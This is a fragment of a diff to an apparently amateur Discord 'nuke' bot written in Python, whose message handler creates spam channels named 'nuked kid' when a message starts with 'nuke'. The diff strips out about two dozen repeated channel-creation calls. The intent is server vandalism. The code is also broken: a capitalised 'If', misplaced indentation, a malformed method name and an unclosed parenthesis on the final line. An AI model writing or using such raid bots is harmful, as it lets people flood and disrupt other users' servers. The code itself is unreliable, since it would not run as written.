@@ -16,56 +16,10 @@ async def on_ready():
 
 async def on_message(message):
 
-  if (message.content.startswith('nuke')):
+If (message.content.startswith('nuke')):
 
 await message.guild_create_text_channel('nuked kid')
 
-await message.guild_create_text_channel('nuked kid')
 
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
-
-await message.guild_create_text_channel('nuked kid')
 
   client.run(os.getenv("TOKEN")
